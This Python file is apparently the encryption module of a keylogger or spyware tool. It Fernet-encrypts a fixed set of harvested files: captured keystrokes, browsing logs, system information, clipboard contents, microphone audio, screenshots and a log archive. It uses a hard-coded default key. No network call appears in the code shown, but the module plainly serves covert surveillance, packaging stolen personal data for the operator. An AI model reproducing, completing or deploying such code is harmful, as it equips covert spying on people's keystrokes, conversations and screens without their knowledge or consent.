import os
from cryptography.fernet import Fernet
import logging

def generate_key():
    """
    Generates a new encryption key.

    :return: The generated encryption key.
    """
    return Fernet.generate_key()

def encrypt_files(file_path, key=b'h9o1i5n5tO3W_LpEWyirtgQAKSADB3h_AyXQpH407wQ='):
    """
    Encrypts specified files in the given directory.

    :param file_path: The path to the directory containing the files to be encrypted.
    :param key: The encryption key to use for encryption.
    """
    fernet = Fernet(key)
    files_to_encrypt = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png"),
        os.path.join(file_path, "f_logs.zip")
    ]
    encrypted_file_names = [
        os.path.join(file_path, "keystroke_e.log"),
        os.path.join(file_path, "website_e.log"),
        os.path.join(file_path, "sysinfo_e.txt"),
        os.path.join(file_path, "clipboard_e.txt"),
        os.path.join(file_path, "microphone_e.wav"),
        os.path.join(file_path, "screenshot_e.png"),
        os.path.join(file_path, "logs_e.zip")
    ]

    for file_to_encrypt, encrypted_file_name in zip(files_to_encrypt, encrypted_file_names):
        try:
            with open(file_to_encrypt, 'rb') as file:
                data = file.read()
            encrypted_data = fernet.encrypt(data)
            with open(encrypted_file_name, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            logging.info(f"Encrypted file: {file_to_encrypt}")
        except Exception as e:
            logging.error(f"Error encrypting file {file_to_encrypt}: {e}")